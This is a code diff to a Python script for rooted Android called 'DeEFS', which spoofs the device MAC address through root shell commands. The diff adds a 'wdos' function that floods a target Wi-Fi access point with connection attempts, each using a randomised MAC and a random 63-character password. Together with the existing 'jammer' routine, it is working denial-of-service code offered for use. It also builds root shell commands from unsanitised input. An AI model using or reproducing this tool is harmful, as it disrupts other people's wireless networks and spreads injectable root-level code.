@@ -1,8 +1,10 @@
-#DeEFS 1.6
+#DeEFS 2.0
 from random import choice as rch
 from os import system as sy
 from time import sleep as sl
 import subprocess,re
+def unicg(la):
+  hc = range(0x10000,0x110000);return ''.join(chr(rch(hc)) for _ in range(la))
 def wcon(bssid,pasw,typed):sy("su -c cmd wifi connect-network "+bssid+" "+typed+" "+(pasw if typed != "open" else ""))
 def bmac(val):
   if val == 0:mc = open("/efs/wifi/.mac.cob");cob=mc.read();return cob
@@ -50,6 +52,10 @@ def wjammer(reg,s,tar,typed="open",pasw=""):
     if tar == "rand":macs=dumpwlan();macx=rch(macs)
     else: macx=tar
     sl(s);dwlan(str(macx),rf=True);wcon(macx,pasw,typed);print("\u001b[32m["+str(i+1)+","+macx+"] wlan jammer packet send")
+  dwlan(str(back))
+def wdos(reg,s,tar,typed="wpa2"):
+  back=bmac(0)
+  for i in range(reg):ja=dwlan("rand");wcon(tar,unicg(63),typed);print("\u001b[32m["+str(i+1)+","+tar+"] wlan jammer packet send > "+ja);sl(s)
   dwlan(str(back))
 def cusefs(dict,value):sy("su -c echo "+value+" > /efs/"+dict)
 #jump_out
